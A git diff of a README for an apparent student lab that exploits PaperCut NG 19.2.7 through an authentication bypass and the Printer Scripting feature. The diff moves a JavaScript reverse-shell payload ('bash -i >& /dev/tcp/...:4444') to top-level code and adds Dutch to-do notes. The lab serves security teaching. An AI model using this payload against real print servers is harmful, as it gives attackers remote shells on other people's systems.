@@ -5,6 +5,7 @@
 1. Download and unzip the files directory.
 
 - [Download link](https://hogent-my.sharepoint.com/:u:/g/personal/tuur_lammens2_student_hogent_be/IQD9ys_iPgBaRbVHIWtT64qjAVXEZbs4Yayvq5ibPBAzgQw?e=CsNsXj)
+  - ==NOTE== moet kali dvi nog toevoegen!
 - This contains the Papercut NG 19.2.7 install script and a lightly modified vdi drive.
 - The vdi drive had network adapters configured. That is everything. ip is `192.168.100.50`
 
@@ -23,16 +24,18 @@
 3. Make sure that the host-only network of `192.168.100.0/24` already exists in virtualbox gui
 
 - ![Virtualbox gui](./static/vbox-network-gui.png)
-- You can keep adding new ones untill you reach number 5.
+- You can keep adding new ones until you reach number 5.
 - The set ip does not matter, the script automatically changes this.
 - **But the network itself should exist!**
 
-4. If everything is configured correctly, you can run `./setup.sh`.
+4. If everything is configured correctly, you can run `./install-kali.sh && ./install-ubuntu.sh`.
 
 - If anything goes wrong during provisioning, it is good practace to stop and remove the VM.
   - The provisioning part is skipped if there is a VM with the same name.
 
 ## Exploit
+
+==NOTE==: moet aangepast worden!!!
 
 ### Phase 1: The Bypass (Authentication)
 
@@ -59,13 +62,11 @@ Now that you have admin access, you will use the built-in "Printer Scripting" fe
 **Example Payload:**
 
 ```javascript
+var cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.100.60/4444 0>&1"];
+java.lang.Runtime.getRuntime().exec(cmd);
+
 function printJobHook(inputs, actions) {
-  // This executes a bash command to connect back to your host
-  java.lang.Runtime.getRuntime().exec([
-    "/bin/bash",
-    "-c",
-    "bash -i >& /dev/tcp/192.168.100.60/4444 0>&1",
-  ]);
+  // Empty
 }
 ```
 
